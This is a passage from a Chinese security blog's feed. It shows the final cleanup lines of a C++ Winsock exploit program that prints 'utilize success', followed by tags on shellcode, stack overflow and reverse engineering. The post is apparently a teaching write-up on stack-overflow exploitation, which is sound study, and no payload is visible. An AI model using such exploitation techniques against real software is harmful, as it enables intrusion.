class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;utilize success&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">shutdown</span>(fdSock, SD_SEND);</span><br><span class="line"><span class="built_in">closesocket</span>(fdSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果截图：</p><p>!<span class="citation" data-cites="栈溢出漏洞利用">[@栈溢出漏洞利用]</span>(https://cdn.jsdelivr.net/gh/m-Onst/pics@main/blog/202104/20210406202539.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分析目标程序&quot;&gt;分析目标程序&lt;/h1&gt;
&lt;h2 id=&quot;分析大体流程&quot;&gt;分析大体流程&lt;/h2&gt;
&lt;p&gt;使用IDA打开，分析下这个程序的具体功能：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
      
    
    
    
    <category term="shellcode在漏洞利用中的应用" scheme="https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    
    <category term="栈溢出" scheme="https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="shellcode" scheme="https://4st.tech/tags/shellcode/"/>
    
    <category term="漏洞利用" scheme="https://4st.tech/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
</feed>
